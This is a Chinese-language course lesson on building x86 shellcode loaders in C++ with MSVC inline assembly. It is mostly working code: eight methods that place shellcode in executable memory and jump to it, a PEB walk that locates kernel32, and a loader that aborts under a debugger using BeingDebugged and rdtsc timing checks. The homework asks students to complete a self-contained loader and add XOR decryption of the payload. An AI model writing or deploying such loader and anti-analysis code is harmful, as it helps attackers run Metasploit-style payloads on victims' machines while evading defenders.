# 课时01 - C++内联汇编实现ShellCode Loader

## 课程目标
1. 理解内联汇编在ShellCode加载中的应用
2. 掌握使用内联汇编执行ShellCode的方法
3. 了解内联汇编的优势和限制
4. 实现多种内联汇编加载技术

## 名词解释

| 术语 | 全称 | 解释 |
|------|------|------|
| Inline Assembly | 内联汇编 | 在C/C++代码中直接嵌入汇编指令 |
| __asm | - | MSVC内联汇编关键字 |
| naked | 裸函数 | 不生成函数序言和尾声的函数 |
| Prologue | 函数序言 | 函数开始时的栈帧建立代码 |
| Epilogue | 函数尾声 | 函数结束时的栈帧清理代码 |
| JIT | Just-In-Time | 即时编译/执行 |

## 使用工具

| 工具 | 用途 | 备注 |
|------|------|------|
| Visual Studio | 开发环境 | 仅x86支持__asm |
| x64dbg | 调试验证 | 观察汇编执行 |
| msfvenom | 生成测试ShellCode | Metasploit |

## 技术原理

### 1. 内联汇编基础

```cpp
// MSVC语法
__asm {
    mov eax, 1
    add eax, ebx
}

// 单行语法
__asm mov eax, 1
__asm add eax, ebx

// GCC语法 (参考)
asm volatile (
    "mov $1, %%eax\n\t"
    "add %%ebx, %%eax"
    : "=a"(result)
    : "b"(value)
);
```

### 2. naked函数特点

```cpp
__declspec(naked) void NakedFunction() {
    // 没有自动生成的序言代码
    // 没有自动生成的尾声代码
    // 必须手动管理栈和返回
    __asm {
        push ebp
        mov ebp, esp
        // ... 函数体 ...
        mov esp, ebp
        pop ebp
        ret
    }
}
```

### 3. 执行流程

```
┌─────────────────────────────────────┐
│  1. 分配可执行内存                    │
│     VirtualAlloc(PAGE_EXECUTE_...)  │
├─────────────────────────────────────┤
│  2. 复制ShellCode到内存              │
│     memcpy / 内联汇编复制            │
├─────────────────────────────────────┤
│  3. 使用内联汇编跳转执行              │
│     jmp / call 目标地址             │
├─────────────────────────────────────┤
│  4. ShellCode执行并返回              │
│     或 ExitProcess/ExitThread       │
└─────────────────────────────────────┘
```

## 代码实现

### 1. 基础内联汇编Loader

```cpp
// inline_asm_loader.cpp
// 使用内联汇编执行ShellCode (仅x86)

#include <windows.h>
#include <stdio.h>

// 测试ShellCode - MessageBox (需要替换为实际ShellCode)
unsigned char shellcode[] = 
    "\xFC\x33\xD2\xB2\x30\x64\xFF\x32\x5A\x8B"
    "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x33\xC9"
    // ... 省略完整ShellCode
    "\x90\x90\x90\x90\xCC\xC3";  // NOP + INT3 + RET

// 方法1: 基础jmp方式
void Method1_BasicJmp() {
    printf("[*] Method 1: Basic JMP\n");
    
    LPVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!exec) {
        printf("[-] VirtualAlloc failed\n");
        return;
    }
    
    printf("[+] Allocated at: %p\n", exec);
    memcpy(exec, shellcode, sizeof(shellcode));
    
    printf("[*] Jumping to shellcode...\n");
    
    __asm {
        mov eax, exec
        jmp eax
    }
    
    // 注意：如果ShellCode不返回，这里不会执行
    VirtualFree(exec, 0, MEM_RELEASE);
}

// 方法2: call方式（可以返回）
void Method2_CallReturn() {
    printf("[*] Method 2: CALL with Return\n");
    
    LPVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!exec) return;
    
    memcpy(exec, shellcode, sizeof(shellcode));
    
    DWORD result;
    __asm {
        mov eax, exec
        call eax
        mov result, eax
    }
    
    printf("[+] ShellCode returned: 0x%08X\n", result);
    
    VirtualFree(exec, 0, MEM_RELEASE);
}

// 方法3: 保存并恢复所有寄存器
void Method3_SaveRegisters() {
    printf("[*] Method 3: Save/Restore Registers\n");
    
    LPVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!exec) return;
    
    memcpy(exec, shellcode, sizeof(shellcode));
    
    __asm {
        // 保存所有寄存器
        pushad
        pushfd
        
        // 调用ShellCode
        mov eax, exec
        call eax
        
        // 恢复所有寄存器
        popfd
        popad
    }
    
    printf("[+] Execution completed\n");
    VirtualFree(exec, 0, MEM_RELEASE);
}

// 方法4: 使用naked函数封装
__declspec(naked) void ExecuteShellcodeNaked(LPVOID shellcodeAddr) {
    __asm {
        // 获取参数
        mov eax, [esp + 4]  // shellcodeAddr
        
        // 保存寄存器
        pushad
        
        // 跳转执行
        call eax
        
        // 恢复寄存器
        popad
        
        // 返回
        ret
    }
}

void Method4_NakedWrapper() {
    printf("[*] Method 4: Naked Function Wrapper\n");
    
    LPVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!exec) return;
    
    memcpy(exec, shellcode, sizeof(shellcode));
    
    ExecuteShellcodeNaked(exec);
    
    printf("[+] Execution completed\n");
    VirtualFree(exec, 0, MEM_RELEASE);
}

// 方法5: 内联复制和执行
void Method5_InlineCopyExec() {
    printf("[*] Method 5: Inline Copy & Execute\n");
    
    LPVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!exec) return;
    
    // 使用内联汇编复制（避免调用memcpy）
    __asm {
        mov esi, offset shellcode   // 源地址
        mov edi, exec               // 目标地址
        mov ecx, sizeof(shellcode)  // 大小
        rep movsb                   // 复制
        
        // 直接执行
        pushad
        mov eax, exec
        call eax
        popad
    }
    
    VirtualFree(exec, 0, MEM_RELEASE);
}

// 方法6: 栈上执行（小型ShellCode）
void Method6_StackExec() {
    printf("[*] Method 6: Stack Execution (Small Shellcode)\n");
    
    // 注意：需要禁用栈保护，且栈需要可执行权限
    // 现代系统默认开启DEP，此方法可能失败
    
    unsigned char small_shellcode[] = {
        0x31, 0xC0,         // xor eax, eax
        0x40,               // inc eax
        0xC3                // ret
    };
    
    // 尝试使栈可执行
    DWORD oldProtect;
    VirtualProtect(small_shellcode, sizeof(small_shellcode),
        PAGE_EXECUTE_READWRITE, &oldProtect);
    
    DWORD result;
    __asm {
        lea eax, small_shellcode
        call eax
        mov result, eax
    }
    
    printf("[+] Result: %d\n", result);
    
    VirtualProtect(small_shellcode, sizeof(small_shellcode),
        oldProtect, &oldProtect);
}

// 方法7: 使用局部变量作为ShellCode容器
void Method7_LocalVariable() {
    printf("[*] Method 7: Local Variable Container\n");
    
    // 在栈上分配（需要足够小）
    unsigned char local_sc[256];
    
    // 复制
    memcpy(local_sc, shellcode, min(sizeof(shellcode), sizeof(local_sc)));
    
    // 修改权限
    DWORD oldProtect;
    if (!VirtualProtect(local_sc, sizeof(local_sc),
            PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed\n");
        return;
    }
    
    __asm {
        lea eax, local_sc
        pushad
        call eax
        popad
    }
    
    VirtualProtect(local_sc, sizeof(local_sc), oldProtect, &oldProtect);
}

// 方法8: 带参数传递的ShellCode调用
void Method8_WithParameters() {
    printf("[*] Method 8: With Parameters\n");
    
    // 假设ShellCode期望参数在栈上
    LPVOID exec = VirtualAlloc(NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!exec) return;
    
    memcpy(exec, shellcode, sizeof(shellcode));
    
    DWORD param1 = 0x12345678;
    DWORD param2 = 0xDEADBEEF;
    
    __asm {
        // 传递参数（cdecl调用约定）
        push param2
        push param1
        
        // 调用
        mov eax, exec
        call eax
        
        // 清理栈
        add esp, 8
    }
    
    VirtualFree(exec, 0, MEM_RELEASE);
}

int main(int argc, char* argv[]) {
    printf("========================================\n");
    printf("  Inline Assembly ShellCode Loader     \n");
    printf("========================================\n\n");
    
    printf("[!] Note: x86 only, x64 does not support __asm\n\n");
    
    #ifdef _WIN64
    printf("[-] This program must be compiled as x86!\n");
    return 1;
    #endif
    
    int method = 2;  // 默认方法
    if (argc >= 2) {
        method = atoi(argv[1]);
    }
    
    printf("[*] Executing method %d\n\n", method);
    
    switch (method) {
        case 1: Method1_BasicJmp(); break;
        case 2: Method2_CallReturn(); break;
        case 3: Method3_SaveRegisters(); break;
        case 4: Method4_NakedWrapper(); break;
        case 5: Method5_InlineCopyExec(); break;
        case 6: Method6_StackExec(); break;
        case 7: Method7_LocalVariable(); break;
        case 8: Method8_WithParameters(); break;
        default:
            printf("Methods 1-8 available\n");
    }
    
    printf("\n[*] Done.\n");
    return 0;
}
```

### 2. 高级内联汇编技术

```cpp
// advanced_inline_asm.cpp
// 高级内联汇编Loader技术

#include <windows.h>
#include <stdio.h>

// 使用内联汇编动态调用VirtualAlloc
__declspec(naked) LPVOID __stdcall InlineVirtualAlloc(
    SIZE_T dwSize, DWORD flProtect)
{
    __asm {
        // 获取kernel32基址
        mov eax, fs:[0x30]      // PEB
        mov eax, [eax + 0x0C]   // Ldr
        mov eax, [eax + 0x14]   // InMemoryOrderModuleList
        mov eax, [eax]          // ntdll
        mov eax, [eax]          // kernel32
        mov ebx, [eax + 0x10]   // DllBase
        
        // 解析导出表获取VirtualAlloc
        mov eax, [ebx + 0x3C]   // e_lfanew
        mov eax, [ebx + eax + 0x78] // 导出表RVA
        add eax, ebx            // 导出表VA
        
        // 这里需要完整的导出表解析...
        // 简化起见，直接使用已知偏移或硬编码
        
        // 调用VirtualAlloc
        push [esp + 8]          // flProtect
        push 0x1000             // MEM_COMMIT
        push [esp + 12]         // dwSize (调整偏移)
        push 0                  // lpAddress
        
        // call VirtualAlloc
        // 假设地址在某个寄存器中
        
        ret 8
    }
}

// 使用SEH的ShellCode执行
void ExecuteWithSEH(LPVOID shellcode) {
    printf("[*] Executing with SEH protection\n");
    
    __try {
        __asm {
            mov eax, shellcode
            pushad
            call eax
            popad
        }
        printf("[+] Execution completed normally\n");
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception caught: 0x%08X\n", GetExceptionCode());
    }
}

// 完全内联的Loader（不依赖外部函数）
__declspec(naked) void StandaloneLoader() {
    __asm {
        pushad
        
        // === 获取kernel32 ===
        xor ecx, ecx
        mov eax, fs:[0x30]
        mov eax, [eax + 0x0C]
        mov eax, [eax + 0x14]
        
    find_kernel32:
        mov esi, [eax + 0x28]
        test esi, esi
        jz next_module
        
        movzx edx, word ptr [esi]
        or edx, 0x20
        cmp dl, 'k'
        jne next_module
        
        movzx edx, word ptr [esi + 0x0E]
        cmp dl, '3'
        jne next_module
        
        mov ebx, [eax + 0x10]   // kernel32 base
        jmp got_kernel32
        
    next_module:
        mov eax, [eax]
        jmp find_kernel32
        
    got_kernel32:
        // ebx = kernel32
        
        // === 查找VirtualAlloc ===
        // (需要完整的函数查找代码)
        
        // === 分配内存 ===
        push 0x40               // PAGE_EXECUTE_READWRITE
        push 0x1000             // MEM_COMMIT
        push 0x1000             // Size
        push 0                  // NULL
        // call VirtualAlloc
        
        // === 复制ShellCode ===
        // mov edi, eax
        // mov esi, shellcode_address
        // mov ecx, shellcode_size
        // rep movsb
        
        // === 执行 ===
        // call eax
        
        popad
        ret
    }
}

// 反调试内联汇编
__declspec(naked) BOOL IsDebuggerPresentAsm() {
    __asm {
        mov eax, fs:[0x30]      // PEB
        movzx eax, byte ptr [eax + 0x02]  // BeingDebugged
        ret
    }
}

// 带反调试的Loader
void AntiDebugLoader(LPVOID shellcode, SIZE_T size) {
    // 检查调试器
    BOOL debugged;
    __asm {
        mov eax, fs:[0x30]
        movzx eax, byte ptr [eax + 0x02]
        mov debugged, eax
    }
    
    if (debugged) {
        printf("[-] Debugger detected!\n");
        return;
    }
    
    // 时间检测
    DWORD t1, t2;
    __asm {
        rdtsc
        mov t1, eax
    }
    
    // 一些操作
    Sleep(1);
    
    __asm {
        rdtsc
        mov t2, eax
    }
    
    if (t2 - t1 > 0x10000000) {
        printf("[-] Timing anomaly detected!\n");
        return;
    }
    
    // 执行ShellCode
    LPVOID exec = VirtualAlloc(NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (exec) {
        memcpy(exec, shellcode, size);
        
        __asm {
            mov eax, exec
            call eax
        }
        
        VirtualFree(exec, 0, MEM_RELEASE);
    }
}

int main() {
    printf("========================================\n");
    printf("  Advanced Inline ASM Loader           \n");
    printf("========================================\n\n");
    
    #ifndef _WIN64
    // 测试反调试
    if (IsDebuggerPresentAsm()) {
        printf("[-] Debugger detected by ASM check\n");
    } else {
        printf("[+] No debugger detected\n");
    }
    #endif
    
    return 0;
}
```

## 课后作业

### 作业1：完善StandaloneLoader
完成StandaloneLoader函数，实现不依赖任何外部函数的完整加载器。

### 作业2：添加解密功能
在内联汇编中实现XOR解密，执行前解密ShellCode。

### 作业3：实现参数传递
实现一个能够向ShellCode传递多个参数的内联汇编Loader。
